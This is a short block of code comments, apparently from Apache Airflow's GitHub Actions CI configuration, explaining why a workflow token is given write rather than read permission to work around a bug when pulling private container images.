  # Technically read access while waiting for images should be more than enough. However,
  # there is a bug in GitHub Actions/Packages and in case private repositories are used, you get a permission
  # denied error when attempting to just pull private image, changing the token permission to write solves the
  # issue. This is not dangerous, because if it is for "apache/airflow", only maintainers can push ci.yml
  # changes. If it is for a fork, then the token is read-only anyway.
